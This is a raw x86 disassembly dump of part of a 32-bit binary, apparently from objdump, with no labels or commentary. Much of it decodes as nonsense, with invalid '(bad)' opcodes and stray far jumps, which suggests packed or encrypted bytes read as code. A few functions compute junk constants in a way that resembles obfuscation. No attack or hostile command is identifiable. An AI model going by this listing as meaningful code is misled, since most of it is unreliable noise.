  410f5c:	mov    ebx,ecx
  410f5e:	dec    ebx
  410f5f:	push   ebp
  410f60:	stos   DWORD PTR es:[edi],eax
  410f61:	(bad)  
  410f62:	nop
  410f63:	push   eax
  410f64:	fimul  DWORD PTR [edi-0x65eaacf8]
  410f6a:	out    0x4e,al
  410f6c:	jb     0x410efc
  410f6e:	not    BYTE PTR [edi+0xabd0216]
  410f74:	dec    edi
  410f75:	mov    dl,0x2c
  410f77:	jl     0x410f1d
  410f79:	sbb    BYTE PTR [ecx+0x6],ch
  410f7c:	imul   esi,DWORD PTR [edx-0x60158603],0xffffffea
  410f83:	fsubr  st(0),st
  410f85:	and    eax,0x510b3e7b
  410f8a:	sbb    DWORD PTR [edi],0xe8dd236
  410f90:	adc    ebp,DWORD PTR [ebp+ebp*2-0x69]
  410f94:	and    BYTE PTR [edx+ecx*8+0x74],al
  410f98:	ret    
  410f99:	nop
  410f9a:	mov    dl,0x57
  410f9c:	jmp    0x410f68
  410f9e:	loopne 0x410f57
  410fa0:	sti    
  410fa1:	icebp  
  410fa2:	push   edi
  410fa3:	mov    esi,0x68b19ddd
  410fa8:	add    eax,0x89285119
  410fad:	adc    al,0xe8
  410faf:	leave  
  410fb0:	cmp    ebx,DWORD PTR [eax+0x2f]
  410fb3:	jo     0x411012
  410fb5:	cwde   
  410fb6:	dec    ebx
  410fb7:	dec    edi
  410fb8:	call   0xd60f:0xe1a36a00
  410fbf:	mov    bl,0xab
  410fc1:	cmp    DWORD PTR [esi+0x320e2590],eax
  410fc7:	call   0x6550:0x15805d26
  410fce:	jge    0x411013
  410fd0:	mov    cl,0xb0
  410fd2:	mov    ds:0xd3da3ccc,eax
  410fd7:	sbb    DWORD PTR [edx+0x27],ebx
  410fda:	adc    bh,BYTE PTR [edx-0x289db0dd]
  410fe0:	(bad)  
  410fe1:	scas   eax,DWORD PTR es:[edi]
  410fe2:	mov    ds:0xc5af67e6,al
  410fe7:	outs   dx,BYTE PTR ds:[esi]
  410fe8:	cmc    
  410fe9:	ror    ecx,1
  410feb:	(bad)  
  410fec:	dec    edi
  410fed:	(bad)  
  410fee:	sbb    eax,0x16d4eee5
  410ff3:	inc    esi
  410ff4:	gs sahf 
  410ff6:	rcl    DWORD PTR [eax+eiz*8],1
  410ff9:	mov    ss,esp
  410ffb:	repz repz mov eax,0xa2391544
  411002:	stos   DWORD PTR es:[edi],eax
  411003:	ins    BYTE PTR es:[edi],dx
  411004:	retf   0x630b
  411007:	inc    edx
  411008:	ret    0x9e2d
  41100b:	sbb    eax,0x78e39604
  411010:	xor    al,0xbf
  411012:	mov    ds:0xde618306,al
  411017:	push   esi
  411018:	pop    es
  411019:	cmp    dh,ah
  41101b:	mov    ah,BYTE PTR [ecx-0x56a9c65d]
  411021:	jnp    0x410fe1
  411023:	mov    dl,0x9e
  411025:	and    ch,BYTE PTR [ebx]
  411027:	call   0x1ad3:0x7e35785f
  41102e:	jmp    0x411016
  411030:	lods   al,BYTE PTR ds:[esi]
  411031:	retf   
  411032:	outs   dx,DWORD PTR ds:[esi]
  411033:	mov    ecx,DWORD PTR [ebp-0x4]
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x2e]
  4111f1:	lods   al,BYTE PTR ds:[esi]
  4111f2:	or     al,0x7e
  4111f4:	out    dx,al
  4111f5:	jl     0x41120f
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	xlat   BYTE PTR ds:[ebx]
  4111fd:	xchg   ecx,eax
  4111fe:	loope  0x4111f9
  411200:	pop    ebp
  411201:	test   al,0x68
  411203:	push   ds
  411204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411205:	mov    BYTE PTR [ebx+0x534277e3],bh
  41120b:	in     eax,0xaa
  41120d:	push   ebx
  41120e:	mov    ah,0x95
  411210:	xchg   edi,eax
  411211:	inc    ebp
  411212:	fmul   DWORD PTR [ecx+ebx*2]
  411215:	jne    0x41126e
  411217:	ins    BYTE PTR es:[edi],dx
  411218:	pop    eax
  411219:	loop   0x411236
  41121b:	std    
  41121c:	or     eax,0x2ab6559
  411221:	test   BYTE PTR [ebp+0x5f5c5a12],0x33
  411228:	mov    BYTE PTR [ebx+edi*1],al
  41122b:	shl    cl,0xa2
  41122e:	mov    BYTE PTR [esi],bl
  411230:	(bad)  
  411232:	xchg   esp,eax
  411233:	leave  
  411234:	inc    esi
  411235:	mov    eax,ds:0x74b83370
  41123a:	pushf  
  41123b:	jecxz  0x411218
  41123d:	int3   
  41123e:	arpl   di,dx
  411240:	mov    al,0xc6
  411242:	mov    ebx,0xda18f09e
  411247:	dec    ecx
  411248:	cmp    BYTE PTR [ebx],bh
  41124a:	je     0x411242
  41124c:	retf   0xba00
  41124f:	adc    DWORD PTR [edx+0x1c],esp
  411252:	or     al,0x8b
  411254:	retf   
  411255:	lods   al,BYTE PTR ds:[esi]
  411256:	rol    BYTE PTR [ecx],cl
  411258:	daa    
  411259:	jle    0x4112ae
  41125b:	cdq    
  41125c:	and    DWORD PTR [ebx-0xf],edi
  41125f:	fst    DWORD PTR [ecx+esi*4+0x3719829d]
  411266:	pop    ds
  411267:	leave  
  411268:	in     eax,0x72
  41126a:	push   ds
  41126b:	sub    eax,0xd8856ef4
  411270:	mov    edi,0xf020d2d3
  411275:	xor    ch,BYTE PTR [eax]
  411277:	hlt    
  411278:	stos   DWORD PTR es:[edi],eax
  411279:	fstp   DWORD PTR [ecx]
  41127b:	jmp    0x1b85:0x6a6e8729
  411282:	mov    ds:0x16368033,al
  411287:	lds    esp,FWORD PTR [eax+edi*4-0x36b5e140]
  41128e:	je     0x411271
  411290:	dec    ecx
  411291:	outs   dx,BYTE PTR ds:[esi]
  411292:	inc    eax
  411293:	dec    esi
  411294:	pop    ecx
  411295:	(bad)  
  411296:	hlt    
  411297:	adc    dl,BYTE PTR [esi-0x7fb8121d]
  41129d:	sbb    ebp,DWORD PTR [ebx+0x67]
  4112a0:	inc    eax
  4112a1:	push   edx
  4112a2:	jnp    0x4112ba
  4112a4:	and    eax,0xc1da9fb2
  4112a9:	cmp    DWORD PTR [eax+0x400a985f],ebp
  4112af:	fbstp  TBYTE PTR [ecx+0x7f]
  4112b2:	ins    BYTE PTR es:[edi],dx
  4112b3:	fisttp WORD PTR [ecx-0x2a]
  4112b6:	and    edi,0xffffff99
  4112b9:	in     eax,dx
  4112ba:	leave  
  4112bb:	jo     0x411280
  4112bd:	or     ebp,DWORD PTR [eax-0x38]
  4112c0:	mov    dh,0x51
  4112c2:	scas   eax,DWORD PTR es:[edi]
  4112c3:	cmp    esi,DWORD PTR [ebp-0x21]
  4112c6:	lahf   
  4112c7:	push   es
  4112c8:	xlat   BYTE PTR ds:[ebx]
  4112c9:	jg     0x411331
  4112cb:	adc    bh,dh
  4112cd:	mov    ah,0x3f
  4112cf:	call   0x748:0xcb08141a
  4112d6:	push   ds
  4112d7:	cwde   
  4112d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112d9:	mov    WORD PTR [ecx+0x70],ss
  4112dc:	ds adc edi,0xf
  4112e0:	inc    edi
  4112e1:	jg     0x411273
  4112e3:	sbb    BYTE PTR [ebx+ebx*2-0x38c4cd0d],cl
  4112ea:	(bad)  
  4112eb:	dec    esp
  4112ec:	inc    esi
  4112ed:	test   DWORD PTR [ebp+0x746cfa44],ebx
  4112f3:	js     0x4112ba
  4112f5:	pop    edx
  4112f6:	inc    ebx
  4112f7:	sbb    BYTE PTR [ecx],ah
  4112f9:	inc    edi
  4112fa:	repz pop ebp
  4112fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112fd:	jo     0x411378
  4112ff:	and    DWORD PTR [edx+0x480256ad],0x9a316143
  411309:	xor    BYTE PTR [eax+0x58e734e7],dh
  41130f:	bound  esi,QWORD PTR [eax+0x51b8b13d]
  411315:	outs   dx,DWORD PTR ds:[esi]
  411316:	mov    ah,BYTE PTR [edi+edx*2+0x5e3bc231]
  41131d:	pop    edi
  41131e:	dec    esi
  41131f:	cmp    eax,0x5900ec9b
  411324:	enter  0x8da9,0xbf
  411328:	scas   eax,DWORD PTR es:[edi]
  411329:	mov    bl,0x30
  41132b:	xchg   ecx,eax
  41132c:	and    DWORD PTR [eax+0x1e],esi
  41132f:	(bad)  
  411330:	es jle 0x4112d7
  411333:	push   ebp
  411334:	mov    edi,0xd0d856d1
  411339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41133a:	sub    BYTE PTR [ebx+0x7e16d7cc],bh
  411340:	fistp  DWORD PTR [ecx]
  411342:	push   esi
  411343:	mov    ah,0xd5
  411345:	sub    eax,0x10ffcf39
  41134a:	jb     0x411372
  41134c:	out    dx,al
  41134d:	mov    edx,0x2f8e3c3d
  411352:	xchg   DWORD PTR [ebp+0x40],esi
  411355:	js     0x4112df
  411357:	inc    ebx
  411358:	mov    ebx,0x17516b01
  41135d:	inc    eax
  41135e:	outs   dx,BYTE PTR ds:[esi]
  41135f:	sbb    BYTE PTR [esi+ecx*4-0x4a952f9c],cl
  411366:	cmp    eax,0xef536c9b
  41136b:	outs   dx,DWORD PTR ds:[esi]
  41136c:	es add al,ah
  41136f:	inc    ecx
  411370:	dec    eax
  411371:	mov    eax,ds:0xd4f4509
  411376:	jmp    0x4e866bdc
  41137b:	mov    ds:0x57d84e60,eax
  411380:	push   eax
  411381:	pop    ecx
  411382:	xor    bh,BYTE PTR [edi+0x10f9c345]
  411388:	je     0x41136c
  41138a:	cmp    eax,0x2ce4550
  41138f:	int3   
  411390:	push   ebp
  411391:	pop    ebx
  411392:	imul   esi,esi,0xbaaba590
  411398:	and    esp,DWORD PTR [edi+0x30244605]
  41139e:	repnz adc al,0x54
  4113a1:	fsubr  QWORD PTR [ebp+edx*4-0x3a]
  4113a5:	and    BYTE PTR [edx-0x73],ch
  4113a8:	icebp  
  4113a9:	or     al,0x3e
  4113ab:	stc    
  4113ac:	add    DWORD PTR [edi],edx
  4113ae:	lods   al,BYTE PTR ds:[esi]
  4113af:	stos   DWORD PTR es:[edi],eax
  4113b0:	les    ecx,FWORD PTR [edi+0x357091a4]
  4113b6:	fcom   DWORD PTR [esi]
  4113b8:	ins    BYTE PTR es:[edi],dx
  4113b9:	push   eax
  4113ba:	mov    BYTE PTR [esi-0x25],bh
  4113bd:	push   edi
  4113be:	dec    eax
  4113bf:	jge    0x4113e9
  4113c1:	sbb    bh,0x26
  4113c4:	retf   
  4113c5:	mov    eax,ds:0x602ae915
  4113ca:	xor    edi,ecx
  4113cc:	les    esp,FWORD PTR [ecx-0x4b9a54eb]
  4113d2:	xchg   esi,eax
  4113d3:	or     DWORD PTR [eax+ebx*1+0x5],ecx
  4113d7:	cli    
  4113d8:	stos   BYTE PTR es:[edi],al
  4113d9:	inc    ebp
  4113da:	sbb    BYTE PTR [edx],0xa8
  4113dd:	mov    ch,al
  4113df:	pop    ds
  4113e0:	lahf   
  4113e1:	sub    dh,BYTE PTR [edx]
  4113e3:	sahf   
  4113e4:	add    eax,0x2bb8e614
  4113e9:	or     al,0x70
  4113eb:	pop    DWORD PTR [edx+0x44eb7188]
  4113f1:	xor    BYTE PTR [eax],dh
  4113f3:	jne    0x411418
  4113f5:	dec    eax
  4113f6:	xchg   ebp,eax
  4113f7:	jo     0x4113a9
  4113f9:	xor    DWORD PTR [edx+0x6d],esp
  4113fc:	jl     0x41138a
  4113fe:	mov    bh,0x41
  411400:	xchg   al,cl
  411402:	push   0xffffffdc
  411404:	xchg   esi,eax
  411405:	or     edx,DWORD PTR [ebx-0x2d]
  411408:	jmp    0x8929:0x8849c962
  41140f:	push   ebx
  411410:	pop    edx
  411411:	iret   
  411412:	jg     0x411410
  411414:	mov    dh,0x65
  411416:	xor    DWORD PTR [eax],ecx
  411418:	inc    edx
  411419:	es inc ebx
  41141b:	xor    bl,bl
  41141d:	cwde   
  41141e:	(bad)  
  41141f:	xlat   BYTE PTR ds:[ebx]
  411420:	nop
  411421:	adc    bl,BYTE PTR [edx]
  411423:	scas   eax,DWORD PTR es:[edi]
  411424:	mov    edi,0x59b70916
  411429:	mov    al,ds:0x34caf51c
  41142e:	push   edi
  41142f:	ret    
  411430:	mov    BYTE PTR [ecx],dl
  411432:	mov    ebx,0xdcf75d89
  411437:	mov    ecx,0x992a38ff
  41143c:	jl     0x41148c
  41143e:	das    
  41143f:	imul   eax,edx,0x51
  411442:	mov    ecx,0x43b04b1b
  411447:	jge    0x411403
  411449:	jmp    0x13b2:0x99e53f58
  411450:	in     eax,0xff
  411452:	mov    eax,ss:0xff5085c7
  411458:	(bad)  
  411459:	jmp    DWORD PTR [ebp+esi*2+0x0]
  41145d:	add    bh,al
  41145f:	test   DWORD PTR [edi+edi*8-0x1],edx
  411463:	dec    edi
  411465:	sbb    BYTE PTR [eax],al
  411467:	add    bh,al
  411469:	test   DWORD PTR [eax-0x1],esp
  41146c:	(bad)  
  41146d:	push   DWORD PTR ds:0xc7000031
  411473:	test   DWORD PTR [edi+edi*8-0x1],esp
  411477:	dec    DWORD PTR [ebp-0x38ffffaa]
  41147d:	test   DWORD PTR [eax-0x1],esi
  411480:	(bad)  
  411481:	push   edx
  411483:	adc    DWORD PTR [eax],eax
  411485:	add    bh,al
  411487:	test   DWORD PTR [edi+edi*8-0x1],esi
  41148b:	(bad)  
  41148c:	jmp    0xf045:0xc7000063
  411493:	data16 xor BYTE PTR [eax],al
  411496:	add    bh,al
  411498:	inc    ebp
  411499:	clc    
  41149a:	shr    BYTE PTR [esi+0x0],cl
  41149d:	add    BYTE PTR [eax+0x1d],ch
  4114a0:	jle    0x4114a2
  4114a2:	add    cl,ch
  4114a4:	jo     0x4114a8
  4114a6:	add    BYTE PTR [eax],al
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x6f7e2188]
  4114b5:	add    eax,0x78476af8
  4114ba:	sbb    BYTE PTR [eax],bl
  4114bc:	jno    0x4114d2
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	es stos BYTE PTR es:[edi],al
  4114c2:	xchg   ecx,eax
  4114c3:	sub    BYTE PTR [esi-0x76],al
  4114c6:	mov    bl,0x87
  4114c8:	int    0x58
  4114ca:	add    al,0xf1
  4114cc:	in     al,0xd8
  4114ce:	imul   eax,DWORD PTR [edx+0x4e],0xffffff97
  4114d2:	xchg   DWORD PTR [esi+0x2bb10d7b],ebx
  4114d8:	scas   eax,DWORD PTR es:[edi]
  4114d9:	test   DWORD PTR [eax-0x591a0fd],edi
  4114df:	enter  0x74ac,0x49
  4114e3:	mov    ebx,0x6d68e2ee
  4114e8:	inc    esp
  4114e9:	aaa    
  4114ea:	inc    ebp
  4114eb:	cli    
  4114ec:	xor    DWORD PTR [ebx-0x270f2286],0x61
  4114f3:	sbb    al,bh
  4114f5:	test   eax,0x79e3680
  4114fa:	jns    0x411523
  4114fc:	lds    ebx,FWORD PTR [edi+ecx*1-0x53feb68d]
  411503:	mov    ch,0xe4
  411505:	loop   0x411534
  411507:	aam    0xb8
  411509:	les    edx,FWORD PTR [edx+eax*1-0x18]
  41150d:	pop    ss
  41150e:	mov    DWORD PTR [edi],esp
  411510:	and    ebp,DWORD PTR [esi+ebx*2]
  411513:	cmp    DWORD PTR [ebx+0x52],eax
  411516:	mov    ecx,ss
  411518:	clc    
  411519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41151a:	sbb    dh,bl
  41151c:	xchg   DWORD PTR [ecx+0x39e3bfb1],edx
  411522:	mov    eax,0xa8f3b6d1
  411527:	daa    
  411528:	sbb    ebx,DWORD PTR ds:0x40803e55
  41152e:	out    dx,eax
  41152f:	pop    ss
  411530:	add    eax,eax
  411532:	cmp    eax,0x55a31d6e
  411537:	push   edi
  411538:	push   0xb1288e72
  41153d:	mov    ebx,0xa14b3592
  411542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411543:	and    ah,0x7f
  411546:	adc    dl,BYTE PTR [esi+ecx*1+0x3413c3d6]
  41154d:	jecxz  0x4115be
  41154f:	aad    0xe6
  411551:	mov    dl,0xc8
  411553:	add    DWORD PTR [eax-0x4670107a],edi
  411559:	popa   
  41155a:	adc    cl,BYTE PTR [edi]
  41155c:	dec    esp
  41155d:	jge    0x411566
  41155f:	sar    BYTE PTR [eax+0x4550f1eb],cl
  411565:	shr    DWORD PTR [ebx+0x55],0x2a
  411569:	xor    BYTE PTR [ebp+ebx*1+0x1c2cae5b],0x70
  411571:	dec    ecx
  411572:	sub    eax,0x2c5a618
  411577:	mov    ecx,DWORD PTR [ebp+0x63]
  41157a:	jne    0x411500
  41157c:	mov    ebp,0x808e6f4d
  411581:	sti    
  411582:	scas   eax,DWORD PTR es:[edi]
  411583:	sbb    ebp,0x8f5e09c7
  411589:	xor    eax,DWORD PTR [eax]
  41158b:	mov    WORD PTR [eax],cs
  41158d:	repz mov esp,0xa79d4cf9
  411593:	inc    ebp
  411594:	lods   al,BYTE PTR ds:[esi]
  411595:	xchg   ebx,eax
  411596:	xchg   esp,eax
  411597:	(bad)  
  411598:	scas   al,BYTE PTR es:[edi]
  411599:	in     al,dx
  41159a:	scas   al,BYTE PTR es:[edi]
  41159b:	or     dh,BYTE PTR [ebx+0x14]
  41159e:	add    eax,0x6da5622a
  4115a3:	sub    eax,0x4b8d7b46
  4115a8:	sub    ecx,ecx
  4115aa:	(bad)  
  4115ab:	xor    dh,BYTE PTR [edi-0x1d]
  4115ae:	jg     0x41154c
  4115b0:	stos   BYTE PTR es:[edi],al
  4115b1:	cs jg  0x411629
  4115b4:	push   0x628e29a4
  4115b9:	inc    esi
  4115ba:	stos   DWORD PTR es:[edi],eax
  4115bb:	mov    ds:0xa40c28d7,al
  4115c0:	hlt    
  4115c1:	mov    ebx,0x86a77ed9
  4115c6:	scas   al,BYTE PTR es:[edi]
  4115c7:	lock cwde 
  4115c9:	rcl    DWORD PTR [edi],1
  4115cb:	cmp    DWORD PTR [ecx],edi
  4115cd:	int    0xf
  4115cf:	jo     0x4115d2
  4115d1:	stos   DWORD PTR es:[edi],eax
  4115d2:	mov    edi,0xd47c9d36
  4115d7:	sbb    dl,cl
  4115d9:	xchg   al,al
  4115db:	js     0x411643
  4115dd:	mov    ecx,esi
  4115df:	dec    esi
  4115e0:	mov    ebp,0x805a041f
  4115e5:	jmp    0x411654
  4115e7:	dec    edx
  4115e8:	sbb    eax,0xba4998fb
  4115ed:	push   edi
  4115ee:	loopne 0x4115bb
  4115f0:	pop    ss
  4115f1:	or     DWORD PTR [ecx],ecx
  4115f3:	(bad)  
  4115f4:	cld    
  4115f5:	cld    
  4115f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115f7:	pop    ds
  4115f8:	(bad)  
  4115f9:	jmp    0x4115fb
  4115fb:	push   0xd918c372
  411600:	mov    bh,BYTE PTR ds:0xa4d24ab4
  411606:	adc    DWORD PTR [ebp+0x7],edx
  411609:	repz xor dl,ah
  41160c:	xchg   edx,eax
  41160d:	(bad)  
  41160e:	push   ds
  41160f:	mov    bh,0x5e
  411611:	xlat   BYTE PTR ds:[ebx]
  411612:	sbb    al,0xd7
  411614:	outs   dx,DWORD PTR ds:[esi]
  411615:	jle    0x4115a1
  411617:	or     eax,0x85368d88
  41161c:	dec    esp
  41161d:	mov    ds:0x10b53d62,al
  411622:	arpl   WORD PTR [ebx],si
  411624:	cmp    al,0x4f
  411626:	cmp    eax,0xede81660
  41162b:	xchg   edx,eax
  41162c:	sbb    ebp,ebx
  41162e:	das    
  41162f:	fadd   QWORD PTR [edi+edi*2]
  411632:	fistp  WORD PTR [ebp+0x6f]
  411635:	jge    0x41164d
  411637:	inc    ecx
  411638:	call   0xf4b16197
  41163d:	pop    esp
  41163e:	(bad)
  411643:	push   edi
  411644:	nop
  411645:	mov    ch,0x7f
  411647:	and    BYTE PTR fs:[edi],cl
  41164a:	leave  
  41164b:	shl    al,cl
  41164d:	add    ebx,eax
  41164f:	and    eax,0xaafbdb12
  411654:	mov    al,0xe7
  411656:	enter  0x586f,0xd6
  41165a:	jns    0x411670
  41165c:	outs   dx,BYTE PTR ds:[esi]
  41165d:	dec    ebx
  41165e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41165f:	cmp    ecx,ecx
  411661:	ja     0x411673
  411663:	and    bh,BYTE PTR [ecx-0x6585795c]
  411669:	mov    ds,WORD PTR [ebx+0x67]
  41166c:	in     al,dx
  41166d:	fcomp  st(0)
  41166f:	sbb    al,0x44
  411671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411672:	mov    eax,0x9c932261
  411677:	repz and ch,ch
  41167a:	jns    0x4116f2
  41167c:	xchg   ebp,eax
  41167d:	push   ecx
  41167f:	fistp  QWORD PTR [edx+edi*8-0x33]
  411683:	inc    ebx
  411684:	mov    edi,esi
  411686:	mov    eax,0x57b7463
  41168b:	dec    ecx
  41168c:	cmp    ebx,eax
  41168e:	enter  0x1893,0xb
  411692:	jns    0x41161c
  411694:	das    
  411695:	pop    ecx
  411696:	cs out dx,al
  411698:	pop    ds
  411699:	mov    esp,gs
  41169b:	sbb    DWORD PTR [edx],eax
  41169d:	cld    
  41169e:	pop    ds
  41169f:	bound  esp,QWORD PTR [esi-0x3c]
  4116a2:	sub    BYTE PTR [eax],ah
  4116a4:	jmp    0x411694
  4116a6:	push   edi
  4116a7:	add    al,0xa
  4116a9:	sub    eax,0xb60d258f
  4116ae:	sub    ebx,0xe57b9cd8
  4116b4:	repnz int 0x78
  4116b7:	cdq    
  4116b8:	fidiv  WORD PTR [ebx]
  4116ba:	in     eax,dx
  4116bb:	ret    0x24f8
  4116be:	mov    bl,al
  4116c0:	loopne 0x411727
  4116c2:	arpl   WORD PTR [eax],dx
  4116c4:	(bad)  
  4116c5:	adc    dh,bl
  4116c7:	mov    cl,0x4
  4116c9:	pop    eax
  4116ca:	push   ss
  4116cb:	push   esp
  4116cc:	inc    eax
  4116cd:	mov    cl,0x56
  4116cf:	in     eax,0xf9
  4116d1:	or     BYTE PTR [eax+edx*2-0x16],dl
  4116d5:	push   ebx
  4116d6:	jns    0x411726
  4116d8:	xchg   edi,eax
  4116d9:	sub    eax,0x1014353b
  4116de:	in     eax,dx
  4116df:	ret    
  4116e0:	sbb    cl,bh
  4116e2:	cmp    esi,ebp
  4116e4:	dec    ecx
  4116e5:	scas   eax,DWORD PTR es:[edi]
  4116e6:	fist   WORD PTR [ecx+0x76]
  4116e9:	adc    DWORD PTR [ecx+0xe],ecx
  4116ec:	loopne 0x41167b
  4116ee:	jmp    0x22a52f3f
  4116f3:	stos   BYTE PTR es:[edi],al
  4116f4:	mov    dh,BYTE PTR [eax+ecx*4]
  4116f7:	inc    ebx
  4116f8:	(bad)  
  4116fa:	stos   BYTE PTR es:[edi],al
  4116fb:	jg     0x411690
  4116fd:	add    esi,ebp
  4116ff:	(bad)  
  411702:	add    ebx,DWORD PTR [esi]
  411704:	adc    al,0xce
  411706:	(bad)  
  411708:	push   0x7f
  41170a:	or     dh,ch
  41170c:	and    ah,cl
  41170e:	inc    edi
  41170f:	jecxz  0x4116d8
  411711:	and    al,0xe0
  411713:	popa   
  411714:	aaa    
  411715:	or     al,0xf4
  411717:	jb     0x4116e0
  411719:	inc    ebp
  41171a:	cld    
  41171b:	hlt    
  41171c:	xor    BYTE PTR [eax],al
  41171e:	add    BYTE PTR [ebx+0x4d8be045],cl
  411724:	in     al,0x68
  411726:	adc    BYTE PTR [ebx+0x0],0x0
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0x9298aa57
  411755:	xchg   ebx,eax
  411756:	mov    esp,0x1818749e
  41175b:	jno    0x411771
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	shl    bh,0x6
  411762:	fistp  WORD PTR ds:0x88a885ab
  411768:	cmp    ebx,DWORD PTR [esi+0x1f]
  41176b:	loope  0x4117ad
  41176d:	adc    esi,edx
  41176f:	test   BYTE PTR [edx-0x5e0404a6],ah
  411775:	sub    al,ah
  411777:	push   0x3b
  411779:	push   cs
  41177a:	test   DWORD PTR [ebx],ecx
  41177c:	pop    es
  41177d:	lods   eax,DWORD PTR ds:[esi]
  41177e:	and    DWORD PTR [ecx+0x56],esp
  411781:	bts    DWORD PTR [ebp+0x2c92c1b3],ecx
  411788:	inc    ebp
  411789:	inc    ebp
  41178a:	jl     0x411803
  41178c:	push   esi
  41178d:	repz dec eax
  41178f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411790:	(bad)  
  411791:	imul   esp,DWORD PTR [ebx-0x39],0xe245132e
  411798:	sbb    BYTE PTR [edi+0x68],0x7
  41179c:	pop    eax
  41179d:	data16 lods al,BYTE PTR ds:[esi]
  41179f:	pop    ss
  4117a0:	pop    ecx
